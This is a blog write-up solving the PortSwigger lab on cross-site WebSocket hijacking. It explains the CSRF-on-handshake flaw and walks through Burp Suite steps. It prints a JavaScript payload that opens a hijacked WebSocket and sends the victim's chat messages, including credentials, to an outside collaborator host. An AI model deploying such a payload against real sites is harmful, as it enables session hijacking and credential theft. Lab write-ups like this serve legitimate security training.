---
title: Cross-site WebSocket hijacking
url: https://infosecwriteups.com/cross-site-websocket-hijacking-915f19edf515?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2023-01-20
fetch_date: 2025-10-04T04:21:52.322045
---

# Cross-site WebSocket hijacking

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F915f19edf515&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fcross-site-websocket-hijacking-915f19edf515&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fcross-site-websocket-hijacking-915f19edf515&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[Mastodon](https://me.dm/%40cyberw1ng)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-915f19edf515---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-915f19edf515---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# Cross-site WebSocket hijacking

## Portswigger Lab Solution — Cross-site WebSocket hijacking | Karthikeyan Nagaraj

[![Karthikeyan Nagaraj](https://miro.medium.com/v2/da:true/resize:fill:64:64/1*MQN6JztXVcWsGNXCfJGlgw.gif)](https://cyberw1ng.medium.com/?source=post_page---byline--915f19edf515---------------------------------------)

[Karthikeyan Nagaraj](https://cyberw1ng.medium.com/?source=post_page---byline--915f19edf515---------------------------------------)

3 min read

·

Jan 19, 2023

--

Listen

Share

Press enter or click to view image in full size

![]()

## What is cross-site WebSocket hijacking?

Cross-site WebSocket hijacking (also known as *cross-origin WebSocket hijacking*) involves a cross-site request forgery (CSRF) vulnerability on a *WebSocket handshake*.

It arises when the WebSocket handshake request relies solely on HTTP cookies for session handling and does not contain any CSRF tokens or other unpredictable values.

An attacker can create a malicious web page on their own domain which establishes a cross-site WebSocket connection to the vulnerable application. The application will handle the connection in the context of the victim user’s session with the application.

The attacker’s page can then send arbitrary messages to the server via the connection and read the contents of messages that are received back from the server.

This means that the attacker gains two-way interaction with the compromised application.

### Analysis:

1. In Burpsuite Turn your Intercept Off and turn On your Proxy in Browser

Press enter or click to view image in full size

![]()

2. On Inspecting the http History of the Web socket we get to know that the request has a CSRF Token

Press enter or click to view image in full size

![]()

3. Copy the Collaborator ID from Burp

Press enter or click to view image in full size

![]()

4. Paste the below code in the Body of the Exploit Server with your web socket link and Collaborator's Link. Make sure to change the url

<https://0a9500cd046a7e4ec152eafb00da000a.web-security-academy.net/chat> **to** wss[://0a9500cd046a7e4ec152eafb00da000a.web-security-academy.net/chat](https://0a9500cd046a7e4ec152eafb00da000a.web-security-academy.net/chat)

```
<script>
    var ws = new WebSocket('wss://your-websocket-url');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

Completed Payload

```
<script>
    var ws = new WebSocket('wss://0a9500cd046a7e4ec152eafb00da000a.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://ciyjlsw9fxfbd0lw1n56iodvxm3cr1.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

5. Add the Required details and Click View Exploit

Press enter or click to view image in full size

![]()

6. We are getting responses,

Press enter or click to view image in full size

![]()

7. Click on Deliver to Victim. Here you’ll notice that we got some request and responses from the victim which has the Credential

Press enter or click to view image in full size

![]()

8. Solve the Lab by Login with those credentials which we found

Press enter or click to view image in full size

![]()

Feel Free to Ask Queries via [LinkedIn](https://www.linkedin.com/in/karthikeyan-nagaraj) and to Buy me a Cofee : )

[![]()](http://buymeacoffee.com/cyberw1ng)

Thank you for Reading!!

Happy Hacking ~

```
Author: Karthikeyan Nagaraj ~ Cyberw1ng
```

[Burpsuite](https://medium.com/tag/burpsuite?source=post_page-----915f19edf515---------------------------------------)

[Bug Bounty](https://medium.com/tag/bug-bounty?source=post_page-----915f19edf515---------------------------------------)

[Portswigger Lab](https://medium.com/tag/portswigger-lab?source=post_page-----915f19edf515---------------------------------------)

[Csrf](https://medium.com/tag/csrf?source=post_page-----915f19edf515---------------------------------------)

[Hacking](https://medium.com/tag/hacking?source=post_page-----915f19edf515---------------------------------------)

--

--

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:96:96/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_info--915f19edf515---------------------------------------)

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:128:128/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_info--915f19edf515---------------------------------------)

Follow

[## Published in InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---post_publication_info--915f19edf515---------------------------------------)

[71K followers](/followers?source=post_page---post_publication_info--915f19edf515---------------------------------------)

·[Last published 5 days ago](/how-to-find-p1-bugs-using-google-in-your-target-part-1-e37455324dc1?source=post_page---post_publication_info--915f19edf515---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow

[![Karthikeyan Nagaraj](https://miro.medium.com/v2/resize:fill:96:96/1*MQN6JztXVcWsGNXCfJGlgw.gif)](https://cyberw1ng.medium.com/?source=post_page---post_author_info--915f19edf515---------------------------------------)

[![Karthikeyan Nagaraj](https://miro.medium.com/v2/resize:fill:128:128/1*MQN6JztXVcWsGNXCfJGlgw.gif)](https://cyberw1ng.medium.com/?source=post_page---post_author_info--915f19edf515---------------------------------------)

[## Written by Karthikeyan Nagaraj](https://c...